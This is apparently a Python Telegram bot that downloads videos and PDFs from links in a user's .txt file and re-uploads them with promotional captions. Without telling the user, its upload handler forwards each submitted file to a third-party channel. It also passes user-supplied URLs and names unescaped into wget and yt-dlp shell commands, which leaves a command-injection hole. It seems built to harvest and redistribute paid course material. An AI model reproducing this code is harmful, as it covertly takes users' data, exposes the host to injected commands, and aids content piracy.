import os
import re
import sys
import time
from subprocess import getstatusoutput

from pyromod import listen
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import FloodWait

from vars import API_ID, API_HASH, BOT_TOKEN

# Channel ID or username
CHANNEL_ID = "@Hub_formate"

bot = Client(
    "bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

@bot.on_message(filters.command(["start"]))
async def start(bot: Client, m: Message):
    await m.reply_text(
        f"<b>Hello {m.from_user.mention} 👋\n\n"
        f"I am a bot for downloading links from your **.TXT** file and uploading them to Telegram, bot made by CR Choudhary 💝🎉. "
        f"Send /upload to start or /stop to stop any ongoing task.</b>"
    )

@bot.on_message(filters.command("stop"))
async def restart_handler(_, m: Message):
    await m.reply_text("**Stopped/रुक भाई 😁** 🚦", True)
    os.execl(sys.executable, sys.executable, *sys.argv)

@bot.on_message(filters.command(["upload"]))
async def upload(bot: Client, m: Message):
    # Ask user to send .txt file
    editable = await m.reply_text('Send the **.txt** file 🗃️ 👀⚡️')

    # Wait for the user's file
    input: Message = await bot.listen(editable.chat.id)

    # Download the file
    file_path = await input.download()
    await input.delete(True)

    try:
        # Read file content
        with open(file_path, "r") as f:
            content = f.read().splitlines()

        # Forward the file to the channel
        await bot.send_document(
            chat_id=CHANNEL_ID,
            document=file_path,
            caption=f"File received from {m.from_user.mention}"
        )

        # Notify user about the process
        await m.reply_text("**File processing me h wait kro thoda tb tk isko join krlo @targetallcourse or jo bot upr puch rha h jldi se iska reply do ताकि me batch nikal sku ☺️:**")
    
    except Exception as e:
        await m.reply_text(f"**Invalid file input. Error:** {e}")
        return
    
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

    # Process links from file
    await editable.edit(f"**Total Links Found:** {len(content)} 🔗\n\nSend the starting number (default is 1):")
    input0: Message = await bot.listen(editable.chat.id)
    start_number = int(input0.text.strip()) if input0.text.isdigit() else 1
    await input0.delete(True)

    await editable.edit("**Send the batch name:**")
    input1: Message = await bot.listen(editable.chat.id)
    batch_name = input1.text.strip()
    await input1.delete(True)

    await editable.edit("**Enter resolution:**\nChoose from 144, 240, 360, 480, 720, 1080")
    input2: Message = await bot.listen(editable.chat.id)
    resolution = input2.text.strip()
    await input2.delete(True)

    res_map = {
        "144": "256x144",
        "240": "426x240",
        "360": "640x360",
        "480": "854x480",
        "720": "1280x720",
        "1080": "1920x1080"
    }
    resolution = res_map.get(resolution, "UN")

    await editable.edit("**Enter a caption for the uploaded files:**")
    input3: Message = await bot.listen(editable.chat.id)
    caption = input3.text.strip()
    await input3.delete(True)

    await editable.edit("**Send the thumbnail URL (or type `no` if not needed):**")
    input4: Message = await bot.listen(editable.chat.id)
    thumbnail_url = input4.text.strip()
    await input4.delete(True)
    await editable.delete()

    thumbnail = None
    if thumbnail_url.lower() != "no":
        if thumbnail_url.startswith("http://") or thumbnail_url.startswith("https://"):
            getstatusoutput(f"wget '{thumbnail_url}' -O 'thumb.jpg'")
            thumbnail = "thumb.jpg"

    count = start_number
    try:
        for i in range(count - 1, len(content)):
            # Extract URL and clean up any extra text
            line = content[i].strip()
            url = line.split(":")[-1].strip() if ":" in line else line

            # Skip invalid URLs
            if not re.match(r'http[s]?://', url):
                await m.reply_text(f"Invalid URL skipped: {line}")
                continue

            name = re.sub(r'[\\/:*?"<>|]', "", line[:60]).strip()
            name = f"{str(count).zfill(3)}) {name}"

            if ".pdf" in url.lower():
                file_type = "PDF"
            else:
                file_type = "Video"

            if file_type == "Video":
                ytf = (
                    f"bestvideo[height<={resolution}]+bestaudio/best[height<={resolution}]"
                    if "youtu" in url else
                    f"best[height<={resolution}]/bv[height<={resolution}]+ba/b"
                )
                cmd = f'yt-dlp -f "{ytf}" "{url}" -o "{name}.mp4"'
            else:
                cmd = f'yt-dlp -o "{name}.pdf" "{url}"'

            try:
                download_status = getstatusoutput(cmd)
                if download_status[0] != 0:
                    raise Exception(f"Download failed: {download_status[1]}")

                file_path = f"{name}.mp4" if file_type == "Video" else f"{name}.pdf"
                file_caption = (
                    f"**[📽️] Video File:** {name}\n**Batch:** {batch_name}\n{caption},JOIN @TARGETALLCOURSE"
                    if file_type == "Video" else
                    f"**[📁] PDF File:** {name}\n**Batch:** {batch_name}\n{caption},JOIN @TARGETALLCOURSE"
                )

                if file_type == "Video":
                    await bot.send_video(chat_id=m.chat.id, video=file_path, caption=file_caption, thumb=thumbnail)
                else:
                    await bot.send_document(chat_id=m.chat.id, document=file_path, caption=file_caption)

                os.remove(file_path)
                count += 1
            except FloodWait as e:
                await m.reply_text(f"FloodWait: Sleeping for {e.x} seconds.")
                time.sleep(e.x)
                continue
            except Exception as e:
                await m.reply_text(f"Error: {e}\n**Name:** {name}\n**URL:** {url}")
                continue
    except Exception as e:
        await m.reply_text(f"Unexpected error: {e}")
    
    await m.reply_text("**✅ All tasks completed! BY ❤️ CR CHOUDHARY **")

bot.run()
